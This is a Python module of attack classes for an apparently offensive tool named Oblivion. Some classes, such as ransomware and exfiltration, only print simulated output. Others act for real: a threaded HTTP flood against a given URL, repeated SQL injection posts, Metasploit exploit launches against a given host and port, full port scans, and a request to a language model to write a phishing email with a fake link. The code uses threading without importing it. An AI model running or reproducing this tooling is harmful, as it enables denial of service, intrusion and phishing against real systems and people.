# attack_modules.py
import random
import string
import time
import requests
import itertools
from abc import ABC, abstractmethod
from ob1.metasploit_client import MetasploitClient
import subprocess
import shutil
import json
import xml.etree.ElementTree as ET

# --- Abstract Base Class for All Attack Modules ---
class AttackModule(ABC):
    """Abstract base class for a single attack simulation."""
    def __init__(self, oblivion_instance, target):
        self.oblivion = oblivion_instance
        self.target = target
        self.stop_event = oblivion_instance.stop_event

    @abstractmethod
    def execute(self):
        """Executes the main logic of the attack simulation."""
        pass

# --- Individual Attack Module Implementations ---

class PhishingAttack(AttackModule):
    """Simulates a phishing attack."""
    @classmethod
    def prepare(cls, target_desc):
        """Gathers necessary input before instantiating the attack."""
        emails_str = input(f"  Enter comma-separated target emails for '{target_desc}' (e.g., a@b.com,c@d.com): ")
        emails = [e.strip() for e in emails_str.split(',')]
        return {'target_emails': emails} if emails else None

    def execute(self, target_emails):
        print(f"[*] Simulating phishing attack on topic '{self.target}'.")
        phishing_prompt = f"Generate a short, persuasive phishing email body to trick a user into clicking a link related to '{self.target}'. Include a fake link."
        messages = [{"role": "user", "content": phishing_prompt}]
        email_body = self.oblivion._call_mistral_api(messages)

        if not email_body:
            print("[!] Could not generate phishing email body. Attack failed.")
            return False

        print("\n--- Generated Phishing Email ---")
        print(email_body)
        print("------------------------------\n")

        for email in target_emails:
            if self.stop_event.is_set():
                print("[!] Phishing simulation stopped.")
                return False
            print(f"    -> Simulating sending phishing email to {email}...")
            time.sleep(random.uniform(0.5, 1.5))
        print("[+] Phishing simulation complete.")
        return True

class RansomwareAttack(AttackModule):
    """Simulates a ransomware attack."""
    def execute(self):
        print(f"[*] Simulating ransomware attack on '{self.target}'.")
        print(f"    -> Scanning for files in {self.target}...")
        time.sleep(2)
        
        mock_files = [f"document_{i}.docx" for i in range(3)] + [f"photo_{i}.jpg" for i in range(2)] + ["project_data.xlsx"]

        for file in mock_files:
            if self.stop_event.is_set():
                print("[!] Ransomware simulation stopped.")
                return False
            print(f"    -> Encrypting {file}...")
            time.sleep(random.uniform(0.2, 0.8))
        
        if not self.stop_event.is_set():
            print(f"    -> Leaving ransomware note on {self.target}/ransom_note.txt")
            print("[+] Ransomware simulation complete.")
            return True
        return False

class DDoSAttack(AttackModule):
    """Simulates a DDoS attack."""
    def execute(self, duration=30, num_threads=10):
        target_url = self.target
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        print(f"[*] Simulating DDoS attack on {target_url} for {duration} seconds.")
        start_time = time.time()

        def ddos_worker():
            while time.time() - start_time < duration and not self.stop_event.is_set():
                try:
                    requests.get(target_url, timeout=2, stream=True)
                    print(f"    -> Sent request to {target_url}.")
                except requests.RequestException:
                    print(f"    -> Failed to send request to {target_url}.")
                time.sleep(random.uniform(0.05, 0.2))
            print(f"    -> DDoS worker for {target_url} finished.")

        for _ in range(num_threads):
            thread = threading.Thread(target=ddos_worker, daemon=True)
            thread.start()
            self.oblivion.active_threads.append(thread)
        print(f"[+] DDoS attack on {target_url} launched with {num_threads} threads.")
        return True # Launch is considered success

class SQLInjectionAttack(AttackModule):
    """Simulates an SQL Injection attack."""
    def execute(self, payload="' OR '1'='1", duration=30):
        target_url = self.target
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url

        print(f"[*] Simulating SQL Injection on {target_url} for {duration} seconds.")
        start_time = time.time()

        def sql_injection_worker():
            while time.time() - start_time < duration and not self.stop_event.is_set():
                try:
                    requests.post(target_url, data={'username': 'admin', 'query': payload}, timeout=2)
                    print(f"    -> Sent SQLi payload to {target_url}.")
                except requests.RequestException:
                    print(f"    -> Failed to send SQLi payload to {target_url}.")
                time.sleep(random.uniform(0.5, 1.5))
            print(f"    -> SQLi worker for {target_url} finished.")

        thread = threading.Thread(target=sql_injection_worker, daemon=True)
        thread.start()
        self.oblivion.active_threads.append(thread)
        print(f"[+] SQL Injection attack on {target_url} launched.")
        return True

class BruteForceAttack(AttackModule):
    """Simulates a brute-force login attack."""
    @classmethod
    def prepare(cls, target_desc):
        username = input(f"  Enter username for brute force attack on '{target_desc}': ")
        return {'username': username} if username else None

    def execute(self, username, max_len=4, duration=60):
        target_url = self.target
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
            
        print(f"[*] Simulating Brute Force attack on {target_url} for user '{username}'.")
        start_time = time.time()
        
        def brute_force_worker():
            chars = string.ascii_lowercase + string.digits
            for length in range(1, max_len + 1):
                for attempt in itertools.product(chars, repeat=length):
                    if time.time() - start_time > duration or self.stop_event.is_set():
                        print("[!] Brute force attack timed out or was stopped.")
                        return
                    password = "".join(attempt)
                    print(f"    -> Trying {username}:{password}...")
                    time.sleep(0.1)
            print("[!] Brute force password space exhausted.")

        thread = threading.Thread(target=brute_force_worker, daemon=True)
        thread.start()
        self.oblivion.active_threads.append(thread)
        print(f"[+] Brute Force attack on {target_url} launched.")
        return True

class PrivilegeEscalationAttack(AttackModule):
    """Simulates a privilege escalation attempt."""
    @classmethod
    def prepare(cls, target_desc):
        technique = input(f"  Enter technique for '{target_desc}' (e.g., 'kernel exploit', 'sudo misconfig'): ")
        return {'technique': technique} if technique else None

    def execute(self, technique):
        print(f"[*] Simulating Privilege Escalation on {self.target} using: {technique}.")
        time.sleep(random.uniform(1, 3))
        if random.random() < 0.7:
            print(f"    [SUCCESS] Escalated privileges on {self.target} via {technique}.")
            new_sys_name = f"{self.target}_privileged"
            if new_sys_name not in self.oblivion.infiltrated_systems:
                self.oblivion.infiltrated_systems.append(new_sys_name)
            self.oblivion.current_location = self.target # Update location
            return True
        else:
            print(f"    [FAILURE] Privilege escalation failed on {self.target}.")
            return False

class LateralMovementAttack(AttackModule):
    """Simulates lateral movement within a network."""
    @classmethod
    def prepare(cls, target_desc):
        current_system = input(f"  Enter current compromised system to move FROM: ")
        method = input(f"  Enter lateral movement method to '{target_desc}' (e.g., 'PsExec', 'SMB relay'): ")
        return {'current_system': current_system, 'method': method} if all([current_system, method]) else None

    def execute(self, current_system, method):
        print(f"[*] Simulating Lateral Movement from {current_system} to {self.target} via {method}.")
        
        # Check network map for connectivity
        if current_system not in self.oblivion.network_map or self.target not in self.oblivion.network_map[current_system]['connections']:
            print(f"    [FAILURE] No direct network path from '{current_system}' to '{self.target}'.")
            return False

        time.sleep(random.uniform(1, 3))
        if random.random() < 0.8:
            print(f"    [SUCCESS] Moved laterally to {self.target}.")
            if self.target not in self.oblivion.infiltrated_systems:
                self.oblivion.infiltrated_systems.append(self.target)
            self.oblivion.current_location = self.target # Update location
            return True
        else:
            print(f"    [FAILURE] Lateral movement failed to {self.target}.")
            return False

class DataExfiltrationAttack(AttackModule):
    """Simulates data exfiltration."""
    @classmethod
    def prepare(cls, target_desc):
        data_type = input("  Enter type of data to exfiltrate (e.g., 'sensitive docs', 'db records'): ")
        method = input("  Enter exfiltration method (e.g., 'DNS tunneling', 'cloud storage'): ")
        return {'data_type': data_type, 'method': method} if all([data_type, method]) else None

    def execute(self, data_type, method):
        print(f"[*] Simulating Data Exfiltration of {data_type} from {self.target} via {method}.")
        time.sleep(random.uniform(2, 5))
        if random.random() < 0.6:
            print(f"    [SUCCESS] Exfiltrated {data_type} from {self.target}.")
            return True
        else:
            print(f"    [FAILURE] Data exfiltration failed from {self.target}.")
            return False

class ExternalServiceExploitAttack(AttackModule):
    """Launches a Metasploit exploit against an external service."""
    @classmethod
    def prepare(cls, target_desc):
        exploit_name = input("  Enter Metasploit exploit module (e.g., exploit/unix/ftp/vsftpd_234_backdoor): ")
        rhost = input("  Enter RHOST (target IP): ")
        rport = input("  Enter RPORT (target port): ")
        return {"exploit_name": exploit_name, "rhost": rhost, "rport": rport} if exploit_name and rhost and rport else None

    def execute(self, exploit_name, rhost, rport):
        print(f"[*] Launching Metasploit exploit {exploit_name} against {rhost}:{rport}")
        try:
            msf = MetasploitClient()
            options = {"RHOSTS": rhost, "RPORT": int(rport)}
            job_id = msf.run_module("exploit", exploit_name, options)
            print(f"    -> Started Metasploit job {job_id}, waiting for completion...")
            success = msf.wait_for_job(job_id)
            if success:
                print(f"[+] Exploit job {job_id} completed successfully.")
            else:
                print(f"[!] Exploit job {job_id} timed out or failed.")
            return success
        except Exception as e:
            print(f"[!] Metasploit exploit failed: {e}")
            return False

class PortScanAttack(AttackModule):
    """Performs network port scanning using masscan or nmap."""
    @classmethod
    def prepare(cls, target_desc):
        cidr_or_host = input("  Enter CIDR or hostname to scan: ")
        rate = input("  Enter scan rate (default 1000): ")
        return {
            "cidr_or_host": cidr_or_host,
            "rate": int(rate) if rate.strip() else 1000
        }

    def execute(self, cidr_or_host, rate):
        oblivion = self.oblivion
        found_ports = []
        found_hosts = set()
        masscan_path = shutil.which("masscan")
        print(f"[*] Starting port scan on {cidr_or_host} (rate {rate})")
        if masscan_path:
            cmd = [masscan_path, cidr_or_host, "-p1-65535", "--rate", str(rate), "-oJ", "-"]
            try:
                proc = subprocess.run(cmd, capture_output=True, text=True, check=True)
                result = proc.stdout
                data = json.loads(result)
                for entry in data:
                    ip = entry.get("ip")
                    oblivion.assets.add_host(ip, None)
                    found_hosts.add(ip)
                    for portinfo in entry.get("ports", []):
                        port = portinfo.get("port")
                        proto = portinfo.get("proto", "tcp")
                        oblivion.assets.add_service(ip, port, proto, "unknown")
                        found_ports.append((ip, port))
                if found_ports:
                    oblivion.log_event("recon_discovery", {"module": "PortScanAttack", "hosts": list(found_hosts), "ports": found_ports})
                print(f"[+] PortScanAttack found {len(found_ports)} open ports on {len(found_hosts)} hosts.")
                return bool(found_ports)
            except Exception as e:
                print(f"[!] masscan failed: {e}")

        # Fallback to nmap
        print("[*] masscan not available or failed, falling back to nmap.")
        cmd = ["nmap", "-p-", "-T4", "-oX", "-", cidr_or_host]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, check=True)
            xml_data = proc.stdout
            tree = ET.fromstring(xml_data)
            for host in tree.findall("host"):
                addr = host.find("address")
                if addr is not None:
                    ip = addr.attrib.get("addr")
                    oblivion.assets.add_host(ip, None)
                    found_hosts.add(ip)
                    for port_elem in host.findall(".//port"):
                        port = port_elem.attrib.get("portid")
                        proto = port_elem.attrib.get("protocol")
                        state = port_elem.find("state")
                        if state is not None and state.attrib.get("state") == "open":
                            oblivion.assets.add_service(ip, port, proto, "unknown")
                            found_ports.append((ip, port))
            if found_ports:
                oblivion.log_event("recon_discovery", {"module": "PortScanAttack", "hosts": list(found_hosts), "ports": found_ports})
            print(f"[+] PortScanAttack found {len(found_ports)} open ports on {len(found_hosts)} hosts.")
            return bool(found_ports)
        except Exception as e:
            print(f"[!] nmap scan failed: {e}")
            return False

class ServiceFingerprintAttack(AttackModule):
    """Performs nmap service fingerprinting (-sV and optional aggressive scan)."""
    @classmethod
    def prepare(cls, target_desc):
        ip = input("  Enter target IP for service fingerprinting: ")
        ports = input("  Enter comma-separated ports (e.g. 22,80,443): ")
        aggressive = input("  Aggressive scan (-A)? (yes/no): ").lower().startswith("y")
        return {
            "ip": ip,
            "ports": ports,
            "aggressive": aggressive
        }

    def execute(self, ip, ports, aggressive):
        oblivion = self.oblivion
        ports_arg = ",".join([str(p).strip() for p in ports.split(",") if p.strip()])
        cmd = ["nmap", "-sV"]
        if aggressive:
            cmd.append("-A")
        cmd.extend(["-p", ports_arg, "-oX", "-", ip])
        found_services = []
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, check=True)
            xml_data = proc.stdout
            tree = ET.fromstring(xml_data)
            for host in tree.findall("host"):
                addr = host.find("address")
                if addr is not None:
                    ip_addr = addr.attrib.get("addr")
                    for port_elem in host.findall(".//port"):
                        port = port_elem.attrib.get("portid")
                        proto = port_elem.attrib.get("protocol")
                        state = port_elem.find("state")
                        if state is not None and state.attrib.get("state") == "open":
                            service_elem = port_elem.find("service")
                            banner = ""
                            if service_elem is not None:
                                banner = service_elem.attrib.get("product", "")
                                if service_elem.attrib.get("version"):
                                    banner += " " + service_elem.attrib.get("version")
                            oblivion.assets.add_service(ip_addr, port, proto, banner or "unknown")
                            found_services.append({"ip": ip_addr, "port": port, "proto": proto, "service": banner})
            if found_services:
                oblivion.log_event("recon_discovery", {"module": "ServiceFingerprintAttack", "services": found_services})
            print(f"[+] ServiceFingerprintAttack found {len(found_services)} services.")
            return bool(found_services)
        except Exception as e:
            print(f"[!] Service fingerprinting failed: {e}")
            return False